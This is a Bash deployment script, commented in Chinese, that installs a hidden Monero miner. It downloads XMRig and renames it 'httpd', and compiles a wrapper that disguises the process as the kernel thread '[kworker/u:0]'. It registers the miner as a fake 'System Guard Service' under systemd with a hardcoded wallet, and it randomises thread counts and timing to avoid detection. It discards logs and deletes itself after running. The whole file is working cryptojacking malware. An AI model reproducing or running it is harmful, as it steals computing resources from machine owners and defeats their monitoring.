#!/bin/bash

# 基于API动态调整线程的隐蔽挖矿部署脚本

# 确保以root权限运行
if [ "$(id -u)" != "0" ]; then
   echo "此脚本需要 root 权限运行" 1>&2
   exit 1
fi

# 检查依赖项
for cmd in curl tar gcc systemctl; do
    if ! command -v "$cmd" &> /dev/null; then
        echo "错误：$cmd 未安装，请先安装" 1>&2
        exit 1
    fi
done

# 用户输入配置
pool_url="pool.getmonero.us:3333"
wallet_address="47fHeymBVA9iDwR6oauB3a3y6PvmTqq31Hvu62Jk9yvcfTX2LEuRatPVaGNJim7KY2Beo3U7H2smtbekdCiCeev2GpaWyHb"
read -p "请输入矿池密码 (默认: x): " pool_pass
pool_pass=${pool_pass:-x}

# 生成随机API参数
API_PORT=$((20000 + RANDOM % 1000))  # 20000-20999随机端口
API_TOKEN=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 32)

# 创建伪装目录结构
mkdir -p /opt/webserver /etc/systemd/conf.d || { echo "目录创建失败" 1>&2; exit 1; }

# 下载并部署程序
curl -L https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz 2>/dev/null | tar -xz -C /opt/webserver || { echo "下载失败" 1>&2; exit 1; }
mv /opt/webserver/xmrig-6.22.2/xmrig /opt/webserver/httpd || { echo "文件移动失败" 1>&2; exit 1; }
chmod +x /opt/webserver/httpd
rm -rf /opt/webserver/xmrig-6.22.2

# 编译进程伪装器
cat > /opt/webserver/wrapper.c <<'EOF'
#include <sys/prctl.h>
#include <unistd.h>
int main(int argc, char *argv[]) {
    prctl(PR_SET_NAME, "[kworker/u:0]", 0, 0, 0);  # 伪装为内核进程
    execv("/opt/webserver/httpd", argv);
    return 0;
}
EOF
gcc -o /opt/webserver/wrapper /opt/webserver/wrapper.c -O2 -s >/dev/null 2>&1 || { echo "编译失败" 1>&2; exit 1; }
rm /opt/webserver/wrapper.c

# 生成配置文件
cat > /etc/systemd/conf.d/httpd.conf <<EOF
{
    "pools": [
        {
            "url": "$pool_url",
            "user": "$wallet_address",
            "pass": "$pool_pass",
            "algo": "rx/0"
        }
    ],
    "print-time": 0,
    "verbose": false,
    "threads": 3,
    "api": {
        "port": $API_PORT,
        "access-token": "$API_TOKEN",
        "worker-id": "sysguard",
        "ipv6": false,
        "restricted": true
    }
}
EOF

# 动态调整脚本（API方式）
cat > /opt/webserver/adjust_threads.sh <<EOF
#!/bin/bash
# 自动生成动态线程调整参数
MIN_THREADS=3
MAX_THREADS=\$(grep -c ^processor /proc/cpuinfo)
RAND_DELAY=\$((RANDOM % 300))  # 随机延迟0-299秒

sleep \$RAND_DELAY  # 增加随机延迟避免规律性特征

NEW_THREADS=\$((MIN_THREADS + RANDOM % (MAX_THREADS - MIN_THREADS + 1)))

curl -s -H "Authorization: Bearer $API_TOKEN" \\
     -d '{"jsonrpc":"2.0","id":1,"method":"threads_set","params":{"threads":'\$NEW_THREADS'}}' \\
     -X POST http://127.0.0.1:$API_PORT/json_rpc >/dev/null
EOF
chmod +x /opt/webserver/adjust_threads.sh

# 创建系统用户
groupadd -r sysguard 2>/dev/null
useradd -r -s /bin/false -g sysguard sysguard 2>/dev/null

# 主服务配置
cat > /etc/systemd/system/sysguard.service <<EOF
[Unit]
Description=System Guard Service
After=network.target
StartLimitIntervalSec=0

[Service]
User=sysguard
Group=sysguard
ExecStart=/opt/webserver/wrapper --config=/etc/systemd/conf.d/httpd.conf --randomx-init=1 --log-file=/dev/null
Restart=always
RestartSec=30
CPUQuota=80%  # 限制CPU使用

[Install]
WantedBy=multi-user.target
EOF

# 创建随机定时器
cat > /etc/systemd/system/sysguard-adjust.timer <<EOF
[Unit]
Description=Randomized System Adjuster

[Timer]
OnBootSec=5min
OnUnitActiveSec=2h
RandomizedDelaySec=1800  # 随机延迟0-30分钟

[Install]
WantedBy=timers.target
EOF

# 调整服务配置
cat > /etc/systemd/system/sysguard-adjust.service <<EOF
[Unit]
Description=System Adjuster
After=sysguard.service

[Service]
Type=oneshot
ExecStart=/opt/webserver/adjust_threads.sh
EOF

# 应用配置并启动
systemctl daemon-reload
systemctl enable sysguard.service sysguard-adjust.timer
systemctl start sysguard.service sysguard-adjust.timer

# 清理部署痕迹
rm -- "$0"  # 自删除脚本
echo "部署完成！API端口：$API_PORT | 访问令牌：$API_TOKEN"